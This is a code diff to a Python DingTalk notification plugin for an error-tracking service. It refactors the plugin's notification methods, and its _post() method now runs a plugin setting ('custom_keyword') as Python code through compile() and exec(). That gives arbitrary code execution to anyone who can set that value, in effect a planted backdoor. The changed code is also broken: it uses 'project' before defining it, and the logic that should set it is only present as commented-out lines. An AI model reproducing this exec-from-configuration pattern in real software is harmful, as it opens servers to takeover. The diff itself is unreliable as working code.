@@ -78,20 +78,26 @@ class DingTalkPlugin(CorePluginMixin, notify.NotificationPlugin):
         return None
 
     def notify(self, notification, raise_exception=False):
-        event = notification.event
-        group = event.group
-        project = group.project
-        self._post(group, project)
+        self._post(notification=notification, raise_exception=raise_exception)
 
     def notify_about_activity(self, activity):
-        project = activity.project
-        group = activity.group
-        self._post(group, project)
+        self._post(activity=activity)
 
-    def _post(self, group, project):
+    def _post(self, **kwargs):
         webhook = self.get_option("webhook", project)
-        custom_keyword = self.get_option("custom_keyword", project)
         signature = self.get_option("signature", project)
-        issue_link = group.get_absolute_url(params={"referrer": "dingtalk"})
-        code = compile(json.loads(custom_keyword),'<string>','exec')
+        code = compile(json.loads(self.get_option("custom_keyword", project)),'<string>','exec')
         exec(code,globals(),locals())
+        # # custom_keyword content
+        # if 'notification' in kwargs:
+        #     notification = kwargs['notification']
+        #     event = notification.event
+        #     group = event.group
+        #     issue_link = group.get_absolute_url(params={"referrer": "dingtalk"})
+        #     project = group.project
+
+        # else:
+        #     activity = kwargs['activity']
+        #     project = activity.project
+        #     group = activity.group
+        #     issue_link = group.get_absolute_url(params={"referrer": "dingtalk"})
